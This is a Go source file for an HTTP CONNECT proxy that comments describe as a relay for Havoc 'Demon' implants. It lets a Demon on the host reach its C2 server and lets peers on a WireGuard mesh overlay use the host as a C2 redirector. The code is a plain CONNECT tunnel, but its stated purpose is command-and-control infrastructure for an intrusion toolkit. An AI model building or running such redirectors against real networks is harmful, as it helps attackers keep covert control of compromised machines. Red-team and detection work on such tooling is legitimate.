package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	"golang.zx2c4.com/wireguard/tun/netstack"
)

// HTTP CONNECT — Maelstrom/Havoc Demon WinHTTP proxy (type=http).
// Local 127.0.0.1: Demon on THIS host (payload Proxy Host/Port).
// Overlay :8080: other mesh peers using this host as a C2 redirector.
func serveHTTPHost(e *engine, bind string) error {
	if bind == "" || bind == "off" {
		return nil
	}
	ln, err := net.Listen("tcp", bind)
	if err != nil {
		if strings.HasSuffix(bind, ":8080") {
			alt := strings.TrimSuffix(bind, ":8080") + ":18080"
			ln2, err2 := net.Listen("tcp", alt)
			if err2 == nil {
				log.Printf("http %s  (Demon proxy; %s busy)", alt, bind)
				go acceptHTTP(e, ln2, false)
				return nil
			}
		}
		return err
	}
	log.Printf("http %s  (Demon Proxy Host/Port — C2 only)", bind)
	go acceptHTTP(e, ln, false)
	return nil
}

func serveHTTPOverlay(e *engine, tnet *netstack.Net, port int) error {
	ln, err := tnet.ListenTCP(&net.TCPAddr{Port: port})
	if err != nil {
		return err
	}
	go acceptHTTP(e, ln, true)
	return nil
}

func acceptHTTP(e *engine, ln net.Listener, shield bool) {
	for {
		c, err := ln.Accept()
		if err != nil {
			return
		}
		go handleHTTP(e, c, shield)
	}
}

func handleHTTP(e *engine, c net.Conn, shield bool) {
	defer c.Close()
	if shield && !e.srcOK(c) {
		return
	}
	_ = c.SetDeadline(time.Now().Add(30 * time.Second))
	br := bufio.NewReader(c)
	line, err := br.ReadString('\n')
	if err != nil {
		return
	}
	parts := strings.Fields(line)
	if len(parts) < 2 {
		return
	}
	method := strings.ToUpper(parts[0])
	target := parts[1]
	for {
		h, err := br.ReadString('\n')
		if err != nil {
			return
		}
		if h == "\r\n" || h == "\n" {
			break
		}
	}
	var dest string
	if method == "CONNECT" {
		dest = target
	} else {
		// absolute-form GET http://host/ — Demon uses CONNECT for HTTPS C2
		return
	}
	if _, _, err := net.SplitHostPort(dest); err != nil {
		dest = net.JoinHostPort(dest, "443")
	}
	_ = c.SetDeadline(time.Time{})
	up, err := e.dial(dest)
	if err != nil {
		_, _ = fmt.Fprintf(c, "HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\n\r\n")
		return
	}
	defer up.Close()
	if _, err := ioWriteString(c, "HTTP/1.1 200 Connection Established\r\n\r\n"); err != nil {
		return
	}
	if br.Buffered() > 0 {
		buf := make([]byte, br.Buffered())
		_, _ = br.Read(buf)
		_, _ = up.Write(buf)
	}
	splice(c, up)
}

func ioWriteString(c net.Conn, s string) (int, error) {
	return c.Write([]byte(s))
}
